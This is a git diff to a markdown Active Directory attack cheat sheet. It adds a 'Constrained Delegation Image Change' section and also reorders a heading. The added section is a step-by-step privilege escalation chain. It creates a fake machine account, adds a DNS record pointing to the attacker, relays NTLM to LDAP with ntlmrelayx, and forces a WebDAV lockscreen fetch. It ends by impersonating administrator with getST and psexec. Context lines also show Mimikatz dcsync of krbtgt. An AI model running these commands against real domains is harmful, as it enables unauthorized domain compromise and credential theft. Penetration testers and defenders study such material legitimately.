@@ -10,6 +10,7 @@
     * [Printer Bug](#Printer-bug) 
   * [Constrained Delegation](#Constrained-delegation) 
   * [Constrained Delegation Account Takeover](#Constrained-delegation-account-Takeover) 
+  * [Constrained Delegation Image Change](#Constrained-delegation-image-change) 
 * [DNS Admins](#DNS-Admins)
 * [Trust abuse SQL](#Trust-abuse-SQL)
 * [Cross Domain attacks](#Cross-Domain-attacks)
@@ -345,7 +346,8 @@ Invoke-Mimikatz -Command '"Kerberos::ptt <KIRBI FILE>"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
-## Constrained Delegation Account Takeover
+### Constrained Delegation Account Takeover
+- Privescs on target machine
 - Requires the following:
   - An owned system
   - Write privileges on another computerobject
@@ -422,6 +424,54 @@ dir \\<COMPUTER>\C$
 ```
 
 If the dir doesn't work read the blogpost! That might tell you why! (Didn't test the attack myself yet)
+
+### Constrained Delegation Image Change
+- Privescs on local machine
+- Requirements:
+  - An account with a SPN associated (Can use a computer domain account and set SPN)
+  - WebDAV Redirector feature must be installed on the victim machine. (W10 has it by default, but manually installed on server 2016 and later)
+  - A DNS record pointing to the attacker’s machine (By default authenticated users can do this)
+  - Access to the GUI in order to use the “Create your picture –> Browse for one” functionality. 
+- https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/
+
+#### Check who can add computers to the domain
+```
+(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
+
+Get-DomainObject | Where-Object ms-ds-machineaccountquota
+```
+
+#### Create a new computer object
+- https://github.com/Kevin-Robertson/Powermad
+```
+import-module powermad
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+
+#### Create a DNS record pointing to the attacker's machine IP
+- Use the created new computer object
+```
+$creds = get-credential
+Invoke-DNSUpdate -DNSType A -DNSName attacker.<DOMAIN> -DNSData <IP> -Credential $creds -Realm <DOMAIN>
+```
+
+#### Serve image with impacket
+```
+ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access -escalate-user machine$ --serve-image ./image.jpg
+```
+
+#### Change lockscreen image
+- https://github.com/nccgroup/Change-Lockscreen
+```
+change-lockscreen --webdav \\atacker@80\
+```
+
+#### Impersonate any user
+```
+getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
+Export KRB5CCNAME=administrator.ccache
+Psexec.py -k -no-pass <TARGET FQDN>
+```
 
 ## DNS Admins
 #### Enumerate member of the DNS admin group
